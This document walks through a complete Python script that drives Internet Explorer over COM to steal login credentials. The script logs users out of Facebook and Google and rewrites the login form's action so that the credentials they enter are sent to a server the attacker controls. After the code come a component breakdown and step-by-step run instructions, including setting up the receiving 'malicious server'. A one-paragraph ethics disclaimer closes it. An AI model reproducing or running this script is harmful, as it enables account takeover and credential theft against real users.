# Browser Hijacking and Login Redirect Script

This script seems to attempt to hijack a user's browser session to capture login details, particularly targeting certain websites such as Facebook, Gmail, and Google Accounts. It interacts with Internet Explorer's COM interface to monitor browser activities and modifies login forms to redirect data to a malicious server.


```python
import time
import urllib.parse
import win32com.client

data_receiver = "http://localhost:8080/"

target_sites = {
    "www.facebook.com": {
        "logout_url": None,
        "logout_form": "logout_form",
        "login_form_index": 0,
        "owned": False 
    },
    "accounts.google.com": {
        "logout_url": "https://accounts.google.com/Logout?hl=en&continue="
                      "https://accounts.google.com/"
                      "ServiceLogin%3Fservice%3Dmail",
        "logout_form": None,
        "login_form_index": 0,
        "owned": False 
    }
}

target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}' # internet explorer class ID

windows = win32com.client.Dispatch(clsid)

def wait_for_browser(browser):
    # wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return

while True:
    for browser in windows:
        url = urllib.parse.urlparse(browser.LocationUrl)
        if url.hostname in target_sites:
            if target_sites[url.hostname]["owned"]:
                continue
            # if there's a url we can just redirect
            if target_sites[url.hostname]["logout_url"]:
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser)
            else:
                # retrieve all elements in the document
                full_doc = browser.Document.all
                # iterate looking for the logout form
                for obj in full_doc:
                    try:
                        # find the logout form and submit it
                        if obj.id == target_sites[url.hostname]["logout_form"]:
                            obj.submit()
                            wait_for_browser(browser)
                    except:
                        pass 
            
            try:
                # now modify the login form
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.parse.quote(browser.LocationUrl)
                browser.Document.forms[login_index].action = f"{data_receiver}{login_page}"
                target_sites[url.hostname]["owned"] = True
            except:
                pass
        time.sleep(5)
```

#### Key Components of the Code:

1. **Libraries Used**:
   - **`time`**: Used to pause the script for a short period, allowing pages to load before performing actions.
   - **`urllib.parse`**: Provides functions for parsing and manipulating URLs.
   - **`win32com.client`**: A library that allows interaction with COM objects, specifically used here to control Internet Explorer's COM interface.

2. **Global Variables**:
   - **`data_receiver`**: The server that receives the hijacked login data (usually a malicious server on `localhost` in this case).
   - **`target_sites`**: A dictionary of websites (Facebook, Google, Gmail) that the script targets. Each site has attributes like:
     - `logout_url`: The URL to redirect to in order to log the user out.
     - `logout_form`: The ID of a form element to submit to log out the user.
     - `login_form_index`: The index of the login form on the page.
     - `owned`: A flag indicating whether the site has been hijacked.

3. **COM Object (`windows`)**:
   - The script interacts with Internet Explorer (via the `clsid` for the browser) to control it. It uses `win32com.client.Dispatch(clsid)` to interface with Internet Explorer.

4. **Functions**:
   - **`wait_for_browser(browser)`**: This function waits for the browser to finish loading a page (indicated by `ReadyState`).
   - **Main Loop**: The `while True` loop checks the current browser window for target URLs, performs the hijacking actions, and redirects or modifies the login form as needed.

#### Workflow:

1. **Monitoring Browsers**: 
   - The script fetches all open instances of Internet Explorer and checks the current URL (`browser.LocationUrl`).

2. **Target Sites**:
   - The script identifies if the current URL belongs to one of the target sites (Facebook, Google, Gmail).
   
3. **Logout Process**:
   - If the site has a logout URL defined (like for Google), it navigates the browser to that logout URL to log the user out. If a logout form is provided, it submits the form.

4. **Login Form Modification**:
   - After logging the user out (or if no logout option exists), the script attempts to modify the login form on the page. Specifically, it changes the form's `action` attribute to send the data to the `data_receiver` (malicious server). This allows the attacker to capture login credentials.

5. **Ownership Flag**:
   - Once the login form has been hijacked, the `owned` flag for that site is set to `True`, so the script doesn't attempt to hijack the form again for that site.

6. **Looping**:
   - The script runs in a loop, checking browsers every 5 seconds (`time.sleep(5)`), allowing it to continuously monitor and hijack sessions.

#### How to Run:

To run this script:

1. **Set Up a Malicious Server**: Ensure that you have a server running on `localhost:8080` (the `data_receiver` address) to receive the redirected login data.
   
2. **Dependencies**:
   - Make sure you have the necessary dependencies installed:
     - `pywin32` library to interact with Windows COM objects (`win32com.client`).
     - You can install it via `pip`:
       ```bash
       pip install pywin32
       ```

3. **Run the Script**: 
   - Save the script to a `.py` file (e.g., `browser_hijacker.py`).
   - Run the script using Python:
     ```bash
     python browser_hijacker.py
     ```

### Ethical Concerns:
This script is illegal and unethical. It is an example of a **man-in-the-middle attack** targeting browsers and hijacking login sessions. This type of activity violates privacy and can cause severe damage. Do not use this code for malicious purposes. It is important to respect user privacy and security and to follow ethical practices in cybersecurity.
